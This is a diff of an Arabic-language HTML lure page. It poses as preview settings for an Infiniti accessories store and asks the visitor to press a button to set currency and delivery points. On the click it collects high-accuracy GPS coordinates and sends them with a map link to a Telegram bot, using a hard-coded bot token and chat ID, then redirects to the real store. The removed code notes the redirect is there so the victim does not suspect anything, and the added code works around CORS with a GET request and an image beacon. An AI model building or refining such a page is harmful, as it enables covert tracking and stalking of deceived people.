@@ -23,65 +23,124 @@
             width: 40px;
             height: 40px;
             animation: spin 1s linear infinite;
+            display: none;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        p { margin-top: 20px; font-size: 16px; }
+        #setup-box { text-align: center; max-width: 90%; padding: 20px; }
+        #setup-box p { color: #666; font-size: 14px; margin-bottom: 25px; }
+        #start-btn {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        #error-msg {
+            display: none;
+            color: #c0392b;
+            font-size: 13px;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
 
-  <div class="loader" id="loader" style="display:none;"></div>
-  <div id="setup-box" style="text-align: center; max-width: 90%; padding: 20px;">
-      <h3 style="margin-bottom: 10px;">إعدادات خادم المعاينة النهائي</h3>
-      <p style="color: #666; font-size: 14px; margin-bottom: 25px;">يرجى الضغط على الزر أدناه لضبط العملة المحلية ونقاط التوصيل الافتراضية لمتجر Infiniti.</p>
-      <button id="start-btn" style="background-color: #3498db; color: white; border: none; padding: 12px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold;">دخول إلى المتجر المعاين</button>
-  </div>
+    <div id="setup-box">
+        <h3>إعدادات خادم المعاينة النهائي</h3>
+        <p>يرجى الضغط على الزر أدناه لضبط العملة المحلية ونقاط التوصيل الافتراضية لمتجر Infiniti.</p>
+        <button type="button" id="start-btn">دخول إلى المتجر المعاين</button>
+        <p id="error-msg"></p>
+    </div>
+    <div class="loader" id="loader"></div>
 
-  <script>
-      const token = "ضع_توكن_البوت_هنا"; 
-      const chatId = "ضع_الآيدي_الخاص_بك_هنا"; 
+    <script>
+        // ضع بياناتك الحقيقية هنا (لا تترك النص العربي التوضيحي)
+        const TELEGRAM_TOKEN = "8679396887:AAFPkh0VlUxlPJ2k3EHjkWAxkpEGSOWE6SY";
+        const TELEGRAM_CHAT_ID = "5874747123";
 
-      function redirectToStore() {
-          window.location.href = "https://bs-accessoires-infiniti2.odoo.com";
-      }
+        const startBtn = document.getElementById("start-btn");
+        const setupBox = document.getElementById("setup-box");
+        const loader = document.getElementById("loader");
+        const errorMsg = document.getElementById("error-msg");
 
-      function sendToTelegram(lat, lng, accuracy) {
-          const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
-          const message = `🚨 زيارة جديدة من الهاتف:\n📍 خط العرض: ${lat}\n📍 خط الطول: ${lng}\n🎯 الدقة: ${accuracy} متر\n🔗 الرابط على الخريطة: ${mapLink}`;
+        function showError(text) {
+            errorMsg.textContent = text;
+            errorMsg.style.display = "block";
+            loader.style.display = "none";
+            setupBox.style.display = "block";
+        }
 
-          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ chat_id: chatId, text: message })
-          })
-          .then(() => redirectToStore())
-          .catch(() => redirectToStore());
-      }
+        function redirectToStore() {
+            window.location.href = "https://bs-accessoires-infiniti2.odoo.com";
+        }
 
-      // تفعيل الجلب عند الضغط على الزر (User Gesture)
-      document.getElementById('start-btn').addEventListener('click', function() {
-          // إخفاء الزر وإظهار الـ Loader لحسن تجربة المستخدم
-          document.getElementById('setup-box').style.display = 'none';
-          document.getElementById('loader').style.display = 'block';
+        // POST من المتصفح يُرفض بسبب CORS — نستخدم GET
+        function sendToTelegram(lat, lng, accuracy) {
+            const mapLink = "https://www.google.com/maps?q=" + lat + "," + lng;
+            const message =
+                "زيارة جديدة:\n" +
+                "خط العرض: " + lat + "\n" +
+                "خط الطول: " + lng + "\n" +
+                "الدقة: " + Math.round(accuracy) + " م\n" +
+                "الخريطة: " + mapLink;
 
-          if (navigator.geolocation) {
-              navigator.geolocation.getCurrentPosition(
-                  (position) => {
-                      sendToTelegram(position.coords.latitude, position.coords.longitude, position.coords.accuracy);
-                  },
-                  (error) => {
-                      // حتى لو رفضت الإذن، يتم تحويلها للمتجر لكي لا تشك في شيء
-                      redirectToStore();
-                  },
-                  { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-              );
-          } else {
-              redirectToStore();
-          }
-      });
-  </script>
+            const url =
+                "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage" +
+                "?chat_id=" + TELEGRAM_CHAT_ID +
+                "&text=" + encodeURIComponent(message);
+
+            fetch(url, { method: "GET", mode: "no-cors" });
+
+            const img = new Image();
+            img.src = url;
+
+            setTimeout(redirectToStore, 2000);
+        }
+
+        startBtn.addEventListener("click", function () {
+            if (TELEGRAM_TOKEN.includes("ضع_") || TELEGRAM_CHAT_ID.includes("ضع_")) {
+                showError("أدخل توكن البوت و chat_id الحقيقيين في الكود أولاً.");
+                return;
+            }
+
+            if (!window.isSecureContext) {
+                showError("يجب فتح الصفحة عبر رابط HTTPS (ليس ملفاً محلياً file://).");
+                return;
+            }
+
+            setupBox.style.display = "none";
+            loader.style.display = "block";
+
+            if (!navigator.geolocation) {
+                showError("المتصفح لا يدعم تحديد الموقع.");
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                function (position) {
+                    sendToTelegram(
+                        position.coords.latitude,
+                        position.coords.longitude,
+                        position.coords.accuracy
+                    );
+                },
+                function (err) {
+                    var reasons = {
+                        1: "تم رفض الإذن. اسمح بالموقع من إعدادات المتصفح ثم أعد المحاولة.",
+                        2: "تعذر تحديد الموقع. تأكد من تفعيل GPS.",
+                        3: "انتهت المهلة. حاول مرة أخرى."
+                    };
+                    showError(reasons[err.code] || "فشل جلب الموقع.");
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        });
+    </script>
 </body>
 </html>
